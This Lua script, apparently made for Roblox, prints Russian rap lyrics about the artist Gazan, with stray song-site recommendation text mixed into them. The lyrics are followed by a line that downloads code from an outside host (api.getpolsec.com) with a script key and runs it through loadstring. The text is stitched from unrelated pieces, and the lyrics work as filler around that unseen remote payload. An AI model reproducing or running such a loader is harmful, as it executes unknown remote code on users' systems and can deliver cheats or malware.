local text = [[
[Припев]
Мам, я хочу быть как Газан
Такой же хулиган
Петь «а мы стиляги»
И носить бархатные тяги
Мам, я хочу быть как Газан
Такой же хулиган
Петь «обоюдно»
Быть мощным абсолютно

[Постприпев]
Опа
Газан
Хочу быть как Газан

[Куплет]
Пока, пока ночью город спит
На страже Абу бандит
Вместо антидепрессанта
Поставь трек мой на репит (О)
Слушают дети и даже дедули
Мамки, папки и соседи бабули
Если не знаешь трек про подкрадули
Ты кто такой? Давай досвидули (—дули-дули)
You might also like
67 (Six Seven)
Gazan
БАРХАТНЫЕ ТЯГИ (VELVET TRACTION)
Gazan
TRALALERO TRALALA
Gazan
[Припев]
Мам, я хочу быть как Газан
Такой же хулиган
Петь «а мы стиляги»
И носить бархатные тяги
Мам, я хочу быть как Газан
Такой же хулиган
Петь «обоюдно»
Быть мощным абсолютно

[Постприпев]
Опа
Газан
Хочу быть как Газан
]]

print(text);


script_key = "knvuhkmpbpyasffntv9ttv1d"

loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/2acb4704751ba034a6b059e56f85ccb9ef043a827cecdca420bc9584c917aa99.lua"))()
